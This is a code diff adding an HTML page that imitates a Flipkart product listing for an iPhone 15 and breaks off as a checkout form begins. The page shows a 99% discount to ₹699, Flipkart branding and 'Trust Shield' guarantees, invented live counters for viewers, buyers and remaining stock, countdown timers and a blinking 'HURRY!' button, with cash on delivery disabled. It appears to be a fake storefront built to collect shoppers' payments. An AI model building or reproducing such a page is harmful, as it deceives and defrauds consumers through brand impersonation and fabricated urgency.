+    .review-count strong { color: var(--fk-text); }
+    .review-card {
+      display: flex; gap: 10px; padding: 14px 0;
+      border-top: 1px solid #f0f0f0;
+    }
+    .review-avatar {
+      width: 38px; height: 38px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; font-weight: 700; color: #fff; flex-shrink: 0;
+    }
+    .review-body { flex: 1; min-width: 0; }
+    .review-meta {
+      display: flex; align-items: center; gap: 6px; flex-wrap: wrap;
+      margin-bottom: 4px;
+    }
+    .review-stars {
+      display: flex; align-items: center; gap: 2px;
+      font-size: 11px; font-weight: 700; color: var(--fk-green);
+    }
+    .review-tag {
+      font-size: 10px; color: var(--fk-muted); font-weight: 500;
+    }
+    .review-verified {
+      font-size: 10px; color: var(--fk-green); font-weight: 600;
+      display: flex; align-items: center; gap: 2px;
+    }
+    .review-body p { color: #444; line-height: 1.45; font-size: 12px; margin-bottom: 4px; }
+    .review-author { font-size: 11px; color: var(--fk-muted); font-weight: 500; }
+
+    .cart-badge.visible { display: flex; }
+
+    /* extra FOMO */
+    .deal-urgency {
+      display: flex; align-items: center; justify-content: space-between; gap: 8px;
+      background: linear-gradient(90deg, #ff6b35, #ff4444);
+      color: #fff; padding: 7px 12px;
+      font-size: 11px; font-weight: 600;
+      position: sticky; top: 57px; z-index: 99;
+    }
+    .deal-tag {
+      background: rgba(255,255,255,0.2); border-radius: 3px;
+      padding: 2px 6px; font-size: 9px; font-weight: 800; letter-spacing: 0.4px;
+      white-space: nowrap;
+    }
+    .deal-urgency strong { font-weight: 800; font-size: 12px; font-variant-numeric: tabular-nums; }
+    .deal-hot { font-size: 10px; opacity: 0.95; white-space: nowrap; }
+
+    .fomo-ticker-wrap {
+      overflow: hidden; background: #fff8e1;
+      border-top: 1px solid #ffe082; border-bottom: 1px solid #ffe082;
+      padding: 7px 0;
+    }
+    .fomo-ticker {
+      display: flex; gap: 32px; width: max-content;
+      animation: tickerScroll 28s linear infinite;
+      font-size: 11px; color: #795548; font-weight: 500; white-space: nowrap;
+    }
+    .fomo-ticker span { display: inline-flex; align-items: center; gap: 5px; }
+    .fomo-ticker .dot { width: 5px; height: 5px; border-radius: 50%; background: #22c55e; flex-shrink: 0; }
+    @keyframes tickerScroll {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+
+    .stock-meter { margin-top: 12px; }
+    .stock-meter-head {
+      display: flex; justify-content: space-between; align-items: center;
+      font-size: 11px; font-weight: 700; margin-bottom: 6px;
+    }
+    .stock-meter-head .hot { color: #e65100; }
+    .stock-meter-head .pct { color: var(--fk-red); font-weight: 800; }
+    .stock-meter-bar {
+      height: 7px; background: #eee; border-radius: 4px; overflow: hidden;
+    }
+    .stock-meter-fill {
+      height: 100%; background: linear-gradient(90deg, #ff9800, #f44336);
+      border-radius: 4px; transition: width 1.2s ease;
+    }
+
+
+    .fomo-near {
+      margin-top: 10px; padding: 8px 10px;
+      background: #fff3e0; border: 1px solid #ffcc80;
+      border-radius: 6px; font-size: 11px; font-weight: 600; color: #e65100;
+      display: flex; align-items: center; gap: 6px;
+    }
+    .fomo-near svg { width: 14px; height: 14px; fill: #e65100; flex-shrink: 0; }
+
+    .price-drop-tag {
+      display: inline-flex; align-items: center; gap: 4px;
+      background: #fff3e0; color: #e65100;
+      font-size: 10px; font-weight: 700;
+      padding: 3px 8px; border-radius: 3px;
+      margin-bottom: 8px;
+    }
+
+    .bar-buy { position: relative; animation: buyPulse 2s ease-in-out infinite; }
+    @keyframes buyPulse {
+      0%, 100% { box-shadow: inset 0 0 0 0 rgba(255,100,0,0); }
+      50% { box-shadow: inset 0 0 0 2px rgba(255,100,0,0.35); }
+    }
+    .hurry-tag {
+      position: absolute; top: -8px; right: 8px;
+      background: #f44336; color: #fff;
+      font-size: 8px; font-weight: 800; padding: 2px 6px;
+      border-radius: 3px; letter-spacing: 0.5px;
+      animation: hurryBlink 1s ease-in-out infinite;
+    }
+    @keyframes hurryBlink {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.85; transform: scale(1.05); }
+    }
+
+
+    .gallery-wishlist {
+      position: absolute; top: 12px; left: 50%; transform: translateX(-50%);
+      z-index: 3; background: rgba(255,255,255,0.95);
+      border: 1px solid #eee; border-radius: 20px;
+      padding: 4px 10px; font-size: 10px; font-weight: 600;
+      color: var(--fk-muted); box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+      display: flex; align-items: center; gap: 4px;
+    }
+    .gallery-wishlist strong { color: #c2185b; }
+  </style>
+</head>
+<body>
+  <!-- SVG icon defs -->
+  <svg xmlns="http://www.w3.org/2000/svg" style="display:none" aria-hidden="true">
+    <symbol id="i-shield" viewBox="0 0 24 24"><path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 16.17l-4.17-4.17 1.41-1.41L11 14.34l6.59-6.59 1.41 1.41L11 17.17z"/></symbol>
+    <symbol id="i-shield-outline" viewBox="0 0 24 24"><path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v5.7c0 4.54-3.07 8.83-7 9.93-3.93-1.1-7-5.39-7-9.93V6.3l7-3.12z"/></symbol>
+    <symbol id="i-phone" viewBox="0 0 24 24"><path fill="currentColor" d="M17 1H7C5.9 1 5 1.9 5 3v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 18H7V5h10v14z"/></symbol>
+    <symbol id="i-card" viewBox="0 0 24 24"><path fill="currentColor" d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></symbol>
+    <symbol id="i-clock" viewBox="0 0 24 24"><path fill="currentColor" d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/></symbol>
+    <symbol id="i-door" viewBox="0 0 24 24"><path fill="currentColor" d="M19 19V5H5v14h14m0-16a2 2 0 012 2v16a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h14m-7 14v-2h2v2h-2z"/></symbol>
+    <symbol id="i-rupee" viewBox="0 0 24 24"><path fill="currentColor" d="M13.66 7C13.1 5.82 11.91 5 10.5 5H6v2h4.5c.83 0 1.5.67 1.5 1.5S11.33 10 10.5 10H6v1h4.03C12.37 11.19 13.64 12.36 14.5 14H6v2h12v-2h-3.17c-.53-1.53-1.83-2.53-3.33-2.87V7h-1.84z"/></symbol>
+    <symbol id="i-wrench" viewBox="0 0 24 24"><path fill="currentColor" d="M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.3L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1 0-1.4z"/></symbol>
+    <symbol id="i-cash" viewBox="0 0 24 24"><path fill="currentColor" d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></symbol>
+    <symbol id="i-check" viewBox="0 0 24 24"><path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 15l-5-5 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></symbol>
+    <symbol id="i-chip" viewBox="0 0 24 24"><path fill="currentColor" d="M9 3v2H7V3H5v2H3v2h2v2H3v2h2v2H3v2h2v2H3v2h2v-2h2v2h2v-2h2v2h2v-2h2v2h2v-2h2v2h2v-2h2v-2h-2v-2h2v-2h-2v-2h2v-2h-2V9h2V7h-2V5h2V3h-2v2h-2V3h-2v2H9V3zm0 4h6v10H9V7z"/></symbol>
+    <symbol id="i-cpu" viewBox="0 0 24 24"><path fill="currentColor" d="M9 3H7v2H5V3H3v4h2v2H3v4h2v2H3v4h2v-2h2v2h2v-2h2v2h2v-2h2v2h2v-2h2v2h2v-4h-2v-2h2v-4h-2V9h2V5h-2v2h-2V3zm0 4v10h6V7H9z"/></symbol>
+    <symbol id="i-camera" viewBox="0 0 24 24"><path fill="currentColor" d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/><circle fill="currentColor" cx="12" cy="12" r="3.2"/></symbol>
+    <symbol id="i-selfie" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></symbol>
+    <symbol id="i-display" viewBox="0 0 24 24"><path fill="currentColor" d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></symbol>
+    <symbol id="i-star" viewBox="0 0 24 24"><path fill="currentColor" d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z"/></symbol>
+  </svg>
+  <div class="app">
+    <header class="header">
+      <button class="back-btn" aria-label="Back">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#212121" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+      <img class="fk-logo" src="images/flipkart-logo.png" alt="Flipkart">
+      <div class="search-bar">
+        <span class="q">Iphone 15</span>
+        <svg class="search-ico" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-4.5-4.5"/></svg>
+      </div>
+      <button class="cart-btn" aria-label="Cart">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="#212121"><path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49A1 1 0 0020 4H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/></svg>
+        <span class="cart-badge visible" id="cartBadge">12</span>
+      </button>
+    </header>
+
+    <div class="deal-urgency">
+      <span class="deal-tag">LIGHTNING DEAL</span>
+      <span>Ends in <strong id="dealTimer">02:47:18</strong></span>
+      <span class="deal-hot">Lowest price today</span>
+    </div>
+
+    <!-- Gallery -->
+    <div class="gallery">
+      <span class="badge-bestseller">BESTSELLER</span>
+      <div class="gallery-wishlist"><svg class="ico" width="12" height="12" style="color:#c2185b"><use href="#i-star"/></svg> <strong id="wishlistCount">2,847</strong> wishlisted</div>
+      <div class="gallery-actions">
+        <button type="button" aria-label="Wishlist"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg></button>
+        <button type="button" aria-label="Share"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><path d="M4 12v8a2 2 0 002 2h12a2 2 0 002-2v-8M16 6l-4-4-4 4M12 2v13"/></svg></button>
+      </div>
+      <div class="gallery-main" id="galleryMain">
+        <img id="mainImg" class="hero-black" src="images/img-04-lineup.png" alt="iPhone 15 Black" draggable="false">
+      </div>
+      <div class="rating-badge"><span class="star">4.6 <svg class="ico ico-green" width="11" height="11"><use href="#i-star"/></svg></span> | 2.4L+</div>
+      <span class="badge-trust"><svg class="ico ico-blue" width="12" height="12"><use href="#i-shield-outline"/></svg> Trust Shield</span>
+      <div class="dots" id="dots"></div>
+    </div>
+
+    <div class="fomo-ticker-wrap">
+      <div class="fomo-ticker" id="fomoTicker"></div>
+    </div>
+
+    <!-- Color -->
+    <div class="section">
+      <div class="section-title">Selected Color: <span id="colorLabel">Black</span></div>
+      <div class="color-row" id="colorRow"></div>
+    </div>
+
+    <!-- Variant -->
+    <div class="section">
+      <div class="section-title">Variant: <span>128 GB</span></div>
+      <div class="variant-row">
+        <button class="variant active" type="button">
+          <div class="variant-discount">99% off</div>
+          <div class="variant-mrp">₹59,900</div>
+          <div class="variant-price">₹699</div>
+          <div class="variant-left" id="stockLeft">3 left</div>
+        </button>
+        <button class="variant oos" type="button">
+          <div class="variant-discount">7% off</div>
+          <div class="variant-mrp">₹69,900</div>
+          <div class="variant-price">₹64,700</div>
+          <div class="variant-left">1 left</div>
+        </button>
+        <button class="variant oos" type="button">
+          <div class="variant-mrp">₹89,900</div>
+          <div class="variant-price">512 GB</div>
+        </button>
+      </div>
+      <div class="stock-meter">
+        <div class="stock-meter-head">
+          <span class="hot">Selling fast!</span>
+          <span class="pct" id="soldPct">91% sold</span>
+        </div>
+        <div class="stock-meter-bar">
+          <div class="stock-meter-fill" id="soldFill" style="width:91%"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Product info -->
+    <div class="section">
+      <div class="brand-tag">APPLE</div>
+      <div class="price-drop-tag">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M7 14l5-5 5 5H7z"/></svg>
+        Lowest price in 30 days
+      </div>
+      <h1 class="product-name">iPhone 15 (Black, 128 GB)</h1>
+      <div class="price-block">
+        <span class="price-discount">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M7 14l5-5 5 5H7z"/></svg>
+          99%
+        </span>
+        <span class="price-mrp">₹59,900</span>
+        <span class="price-sale">₹699</span>
+      </div>
+      <div class="applied-banner">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+        ₹59,201 off applied for you
+      </div>
+      <div class="price-fee">+ ₹49 Protect Promise Fee ›</div>
+
+      <div class="live-panel">
+        <div class="live-panel-head">
+          <span class="live-dot"></span> Live activity
+        </div>
+        <div class="live-row">
+          <div class="live-item">
+            <span class="live-val" id="viewerCount">847</span>
+            <span class="live-lbl">viewing now</span>
+          </div>
+          <div class="live-div"></div>
+          <div class="live-item">
+            <span class="live-val" id="cartHourCount">63</span>
+            <span class="live-lbl">in cart (1hr)</span>
+          </div>
+          <div class="live-div"></div>
+          <div class="live-item">
+            <span class="live-val hot" id="orderTodayCount">218</span>
+            <span class="live-lbl">sold today</span>
+          </div>
+        </div>
+        <div class="live-row sub">
+          <span><strong id="wishlistLive">2,847</strong> wishlisted</span>
+          <span class="live-dot-sm"></span>
+          <span><strong id="payPending">8</strong> paying now</span>
+        </div>
+      </div>
+
+      <!-- WOW! DEAL -->
+      <div class="wow-deal">
+        <div class="wow-header">
+          <strong>WOW! DEAL</strong>
+          Apply offers for Unbeatable deal
+        </div>
+        <div class="wow-body">
+          <div class="wow-price">
+            <small>Lowest price for you</small>
+            <strong>₹699</strong>
+          </div>
+        </div>
+        <div class="wow-offers">
+          <div class="exchange-row">
+            <div class="exchange-icon"><svg class="ico ico-blue"><use href="#i-phone"/></svg></div>
+            <div class="exchange-text">
+              <strong>Up to ₹19,450</strong>
+              <span>Apple iPhone 13 Mini</span>
+            </div>
+            <button class="offer-apply" type="button">Apply</button>
+          </div>
+          <div class="wow-offers-head">
+            <span>Bank offers</span>
+          </div>
+          <div class="offer-item">
+            <div class="offer-icon"><svg class="ico ico-blue"><use href="#i-card"/></svg></div>
+            <div class="offer-text">
+              <span class="offer-tag">Best value for you</span><br>
+              <strong>Flipkart Axis</strong> · ₹500 off on credit card
+            </div>
+            <button class="offer-apply" type="button">Apply</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Pay Later -->
+    <div class="section">
+      <div class="collapse-head open" data-collapse="paylater">
+        <div class="section-title">Apply for Card and Pay Later</div>
+        <svg class="collapse-chevron" viewBox="0 0 24 24" fill="none" stroke="#212121" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+      </div>
+      <div class="collapse-body open" id="paylater">
+        <div class="collapse-inner">
+          <div class="paylater-cards">
+            <div class="paylater-card">
+              <strong>5% Cashback</strong>
+              Free Flight Ticket worth ₹5,000 on Flipkart Axis Bank Credit Card
+            </div>
+            <div class="paylater-card">
+              <strong>Pay Later</strong>
+              Buy now, pay at your convenience with Flipkart Pay Later
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Delivery -->
+    <div class="section">
+      <div class="section-title">Delivery details</div>
+      <div class="delivery-row">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#2874f0"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 010-5 2.5 2.5 0 010 5z"/></svg>
+        <div>
+          <div class="delivery-city" id="deliveryCity">Deliver to Faridabad, Haryana</div>
+          <div class="delivery-pin" id="pinDisplay">121013</div>
+          <a href="#" id="pinLink">Change delivery location ›</a>
+        </div>
+      </div>
+      <div class="delivery-row">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#2874f0"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4z"/></svg>
+        <div>
+          <div class="delivery-express"><em>EXPRESS</em> Delivery</div>
+          <div class="delivery-date" id="deliveryDateLine">Get it by Fri, 13 Jun</div>
+          <div class="delivery-timer">Order in <span id="orderTimer">01:14:20</span></div>
+        </div>
+      </div>
+      <div class="delivery-row">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#2874f0"><path d="M12 7V3H2v18h20V7H12zM6 19H4v-2h2v2zm0-4H4v-2h2v2zm0-4H4V9h2v2zm0-4H4V5h2v2zm4 12H8v-2h2v2zm0-4H8v-2h2v2zm0-4H8V9h2v2zm0-4H8V5h2v2zm10 12h-8v-2h2v-2h-2v-2h2v-2h-2V9h8v10z"/></svg>
+        <div class="seller-row">
+          Fulfilled by <strong>TrueComRetail</strong>
+          <span class="seller-rating">4.5 <svg class="ico ico-green" width="11" height="11"><use href="#i-star"/></svg></span> · 9 years with Flipkart
+          <a href="#" class="seller-link">See other sellers</a>
+        </div>
+      </div>
+      <div class="fomo-near" id="fomoNear">
+        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 010-5 2.5 2.5 0 010 5z"/></svg>
+        <span id="fomoNearText"><strong id="nearBuyCount">17</strong> people near 121013 bought this in 24 hrs</span>
+      </div>
+    </div>
+
+    <!-- Peace of mind -->
+    <div class="section">
+      <div class="collapse-head open" data-collapse="peace">
+        <div class="section-title">Shop with peace of mind</div>
+        <svg class="collapse-chevron" viewBox="0 0 24 24" fill="none" stroke="#212121" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+      </div>
+      <div class="collapse-body open" id="peace">
+        <div class="collapse-inner">
+          <div class="trust-banner">
+            <div class="trust-banner-top">
+              <div>
+                <strong>Introducing Flipkart Trust Shield</strong>
+                <span class="trust-free">₹999 FREE</span>
+              </div>
+              <div class="trust-shield-icon"><svg class="ico ico-white"><use href="#i-shield"/></svg></div>
+            </div>
+            <div class="trust-features">
+              <div class="trust-feat"><div class="ico-wrap"><svg class="ico ico-blue"><use href="#i-clock"/></svg></div>48-hr issue resolution</div>
+              <div class="trust-feat"><div class="ico-wrap"><svg class="ico ico-blue"><use href="#i-door"/></svg></div>Doorstep service</div>
+              <div class="trust-feat"><div class="ico-wrap"><svg class="ico ico-blue"><use href="#i-rupee"/></svg></div>Upto 100% Refund</div>
+              <div class="trust-feat"><div class="ico-wrap"><svg class="ico ico-blue"><use href="#i-shield-outline"/></svg></div>Damage Protection*</div>
+            </div>
+            <div class="trust-social">19 Lakh+ orders protected with Flipkart Trust Shield</div>
+            <div class="trust-disclaimer">*Accidental damage coverage begins on day 8. Fees apply.</div>
+          </div>
+          <div class="warranty-row">
+            <span class="apple-logo"><svg width="18" height="22" viewBox="0 0 814 1000" fill="#212121"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127C46.7 790.7 0 663 0 541.8c0-194.4 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.1c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"/></svg></span>
+            <span>1 year warranty for phone and 1 year warranty for in Box Accessories.</span>
+          </div>
+          <div class="service-grid">
+            <div class="service-item"><div class="ico-wrap"><svg class="ico ico-blue"><use href="#i-wrench"/></svg></div>7-day brand support ›</div>
+            <div class="service-item service-item-unavail"><div class="ico-wrap"><svg class="ico ico-muted"><use href="#i-cash"/></svg></div><span style="text-decoration:line-through;color:#999">Cash on Delivery</span> <small style="color:#e65100;font-size:10px">Unavailable</small></div>
+            <div class="service-item"><div class="ico-wrap"><svg class="ico ico-blue"><use href="#i-check"/></svg></div>Flipkart Assured ›</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Highlights -->
+    <div class="section">
+      <div class="collapse-head open" data-collapse="highlights">
+        <div class="section-title">Product highlights</div>
+        <svg class="collapse-chevron" viewBox="0 0 24 24" fill="none" stroke="#212121" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+      </div>
+      <div class="collapse-body open" id="highlights">
+        <div class="collapse-inner">
+          <div class="highlight">
+            <div class="highlight-icon"><svg class="ico ico-blue"><use href="#i-chip"/></svg></div>
+            <div class="highlight-text">
+              <strong>128 GB ROM</strong>
+              <span>Store upto 3000 photos</span>
+            </div>
+          </div>
+          <div class="highlight">
+            <div class="highlight-icon"><svg class="ico ico-blue"><use href="#i-cpu"/></svg></div>
+            <div class="highlight-text">
+              <strong>A16 Bionic Chip, 6 Core Processor | Hexa Core</strong>
+              <span>Superfast Multitasking. Extensive Gaming</span>
+            </div>
+          </div>
+          <div class="highlight">
+            <div class="highlight-icon"><svg class="ico ico-blue"><use href="#i-camera"/></svg></div>
+            <div class="highlight-text">
+              <strong>48MP + 12MP Rear Camera</strong>
+              <span>DSLR Like Pictures &amp; Great Zoom</span>
+            </div>
+          </div>
+          <div class="highlight">
+            <div class="highlight-icon"><svg class="ico ico-blue"><use href="#i-selfie"/></svg></div>
+            <div class="highlight-text">
+              <strong>12MP Front Camera</strong>
+              <span>Attractive Selfies with Clear &amp; Sharp Colours</span>
+            </div>
+          </div>
+          <div class="highlight">
+            <div class="highlight-icon"><svg class="ico ico-blue"><use href="#i-display"/></svg></div>
+            <div class="highlight-text">
+              <strong>6.1 inch All Screen OLED Display</strong>
+              <span>Immersive Display. Enhanced Viewing Experience</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Details tabs -->
+    <div class="section">
+      <div class="collapse-head open" data-collapse="details">
+        <div class="section-title">All details</div>
+        <svg class="collapse-chevron" viewBox="0 0 24 24" fill="none" stroke="#212121" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+      </div>
+      <div class="collapse-body open" id="details">
+        <div class="collapse-inner">
+          <div class="tabs" id="tabs">
+            <button class="tab active" data-tab="showcase" type="button">Showcase</button>
+            <button class="tab" data-tab="specs" type="button">Specifications</button>
+            <button class="tab" data-tab="desc" type="button">Description</button>
+            <button class="tab" data-tab="warranty" type="button">Warranty</button>
+          </div>
+          <div class="tab-content" id="tabContent">
+            <div class="apple-showcase" id="appleShowcase">
+              <div class="logo"><svg width="36" height="44" viewBox="0 0 814 1000" fill="#212121"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127C46.7 790.7 0 663 0 541.8c0-194.4 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.1c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"/></svg></div>
+              <div class="name">iPhone</div>
+            </div>
+            <img src="images/img-03-hero.png" alt="iPhone 15 Showcase" id="tabImg" style="display:none">
+            <div class="detail-gallery" id="detailGallery"></div>
+          </div>
+          <button class="show-more" type="button" id="showMoreBtn">Show More ›</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Ratings -->
+    <div class="section">
+      <div class="collapse-head open" data-collapse="ratings">
+        <div class="section-title">Ratings and reviews</div>
+        <svg class="collapse-chevron" viewBox="0 0 24 24" fill="none" stroke="#212121" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+      </div>
+      <div class="collapse-body open" id="ratings">
+        <div class="collapse-inner">
+          <div class="rating-summary">
+            <span class="rating-big">4.6</span>
+            <span class="rating-star"><svg class="ico ico-green" width="22" height="22"><use href="#i-star"/></svg></span>
+            <span class="rating-label">Excellent</span>
+          </div>
+          <div class="rating-bars">
+            <div class="rating-bar-row"><span>5</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:72%"></div></div></div>
+            <div class="rating-bar-row"><span>4</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:18%"></div></div></div>
+            <div class="rating-bar-row"><span>3</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:6%"></div></div></div>
+            <div class="rating-bar-row"><span>2</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:2%"></div></div></div>
+            <div class="rating-bar-row"><span>1</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:2%"></div></div></div>
+          </div>
+          <div class="review-count"><strong>2,41,832</strong> ratings · <strong>18,420</strong> reviews</div>
+          <div id="reviewList"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Sticky bar -->
+    <div class="sticky-bar">
+      <button class="bar-cart" type="button" aria-label="Add to cart">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="#212121"><path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49A1 1 0 0020 4H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/></svg>
+      </button>
+      <button class="bar-buy" id="buyBtn" type="button">
+        <span class="hurry-tag">HURRY!</span>
+        <strong>Buy now</strong>
+        <small>at ₹699 · Only <span id="stockLeftBar">3</span> left</small>
+      </button>
+    </div>
+  </div>
+
+  <!-- Checkout modal -->
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <div class="modal-handle"></div>
+      <div class="modal-top">
+        <button class="modal-close" id="modalClose" type="button" aria-label="Close">×</button>
+        <h2>Checkout</h2>
+        <div class="checkout-steps">
+          <div class="checkout-step active" id="step1">1. Address</div>
+          <div class="checkout-step" id="step2">2. Payment</div>
+        </div>
+      </div>
+
+      <div class="modal-body">
+        <!-- Order summary -->
+        <div class="checkout-card">
+          <div class="order-item">
+            <img src="images/img-04-lineup.png" alt="iPhone 15">
+            <div class="order-item-info">
+              <strong>APPLE iPhone 15 (Black, 128 GB)</strong>
+              <span>Qty: 1 · 99% off applied</span>
